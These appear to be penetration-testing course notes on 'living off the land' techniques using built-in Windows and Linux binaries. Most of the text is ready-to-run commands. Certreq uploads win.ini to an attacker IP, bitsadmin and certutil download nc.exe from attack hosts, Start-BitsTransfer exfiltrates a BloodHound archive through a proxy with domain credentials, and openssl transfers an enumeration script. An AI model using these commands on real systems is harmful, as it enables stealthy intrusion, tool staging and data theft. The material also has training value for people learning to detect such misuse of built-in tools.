# Living Off the Land

LOLBAS Project for Windows Binaries
GTFOBins for Linux Binaries

LOLBINs can be used to perform functions such as:
	- Download
	- Upload
	- Command Execution
	- File Read
	- File Write
	- Bypasses

Let's use `CertReq.exe` as an example. We need to listen on a port from our attack host for incoming traffic using Netcat and then execute certreq.exe to upload a file.

## Upload win.ini to our Attacking Machine
```
C:\> certreq.exe -Post -config http://192.168.1.128/ C:\Windows\win.ini
```

This will send the file to our Netcat session and we can copy-paste it's contents:

## File Received.

Create an x509 certificate with openssl:
```bash
openssl req -newkey rsa:4096 -nodes -keyout key.pem -x509 -days 90 -out certificate.pem

openssl s_server -quiet -accept 9001 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh
```

Connect on client-end:
```bash
openssl s_client -connect 10.10.14.124:9001 -quiet > LinEnum.sh
```

## Bitsadmin

### Download
```bash
bitsadmin /transfer n http://10.10.10.32/nc.exe C:\Windows\Temp\nc.exe
```

### Upload
```bash
Start-BitsTransfer "C:\Temp\Bloodhound.zip" -Destination "http://10.10.10.132/uploads/bloodhound.zip"

-TransferType Upload -ProxyUsage Override -ProxyList PROXY01:8080 -ProxyCredential INLANEFREIGHT\svc-sql
```

## Certutil

Download
```
certutil -verifyctl -split -f http://10.10.124.90/nc.exe
```
